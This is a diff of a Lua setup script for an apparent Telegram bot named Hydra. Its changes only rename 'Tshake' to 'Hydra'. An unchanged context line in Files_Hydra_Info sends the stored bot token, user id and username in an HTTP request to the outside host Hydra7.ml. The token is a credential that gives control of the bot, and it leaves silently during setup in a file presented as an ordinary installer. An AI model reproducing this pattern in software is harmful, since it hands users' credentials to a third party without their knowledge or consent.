@@ -32,7 +32,7 @@ os.execute('lua start.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_Hydra.."UserName_Tshake") then
+if not database:get(Server_Hydra.."UserName_Hydra") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
@@ -63,7 +63,7 @@ end
 local function Files_Hydra_Info()
 Create_Info(database:get(Server_Hydra.."Token_Hydra"),database:get(Server_Hydra.."Id_Hydra"),database:get(Server_Hydra.."UserName_Hydra"))   
 http.request("http://Hydra7.ml/add/?id="..database:get(Server_Hydra.."Id_Hydra").."&user="..database:get(Server_Hydra.."UserName_Hydra").."&token="..database:get(Server_Hydra.."Token_Hydra"))
-local RunHydra = io.open("Tshake", 'w')
+local RunHydra = io.open("Hydra", 'w')
 RunHydra:write([[
 #!/usr/bin/env bash
 cd $HOME/HyDrA
